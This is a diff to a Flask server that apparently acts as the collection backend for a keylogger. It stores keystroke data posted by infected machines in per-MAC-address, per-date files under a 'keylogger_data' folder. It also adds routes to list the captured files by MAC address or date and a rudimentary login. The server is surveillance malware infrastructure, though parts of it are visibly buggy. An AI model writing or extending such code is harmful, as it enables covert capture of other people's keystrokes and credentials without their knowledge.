@@ -1,3 +1,5 @@
+import os
+
 from flask import Flask, render_template, Blueprint, jsonify, request
 import requests
 import json
@@ -15,6 +17,51 @@ with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
 
 app = Flask(__name__)
 CORS(app)
+
+
+approved_login = {}
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    login_dic = dict(request.json)
+    username = login_dic['user']
+    password = login_dic['password']
+    try:
+        if approved_login[username] == password:
+            return render_template()
+    except:
+        return jsonify({'status':'access denied'}), 400
+
+
+@app.route('/get_by_mac', methods=['GET'])
+def get_by_mac():
+    mac_address = request.args['mac']
+    print(mac_address)
+    try:
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
+            dic_mac = json.loads(f.read())
+            for mac in dic_mac:
+                if mac == mac_address:
+                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
+                    return jsonify(files), 200
+        return jsonify({'status':'mac not available'}), 400
+    except:
+        return jsonify({'status':'mac not available'}), 400
+
+
+@app.route('/get_by_mac/get_by_date', methods=['GET'])
+def get_by_date():
+    date = request.args['date']
+    try:
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
+            for mac in f:
+                if mac == date:
+                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
+                    return files, 200
+        return jsonify({'status': 'mac not available'}), 400
+    except:
+        return jsonify({'status':'mac not available'}), 400
 
 
 @app.route('/', methods=['GET'])
@@ -36,11 +83,15 @@ def add_data():
     data = dict_data['data'].encode()
     mac = dict_data['mac']
     try:
-        with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}.json', 'ab') as f:
-            f.write(data)
-            return jsonify({'post':'successful','if exit':'False'}), 200
-    except Exception as e:
-        print(e)
+        os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
+    except FileExistsError:
+        try:
+            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'ab') as f:
+                f.write(data)
+                return jsonify({'post':'successful'}), 200
+        except Exception as e:
+            print(e)
+    return jsonify({'post':'not successful'}), 400
 
 
 @app.route('/send_mac', methods=['POST'])
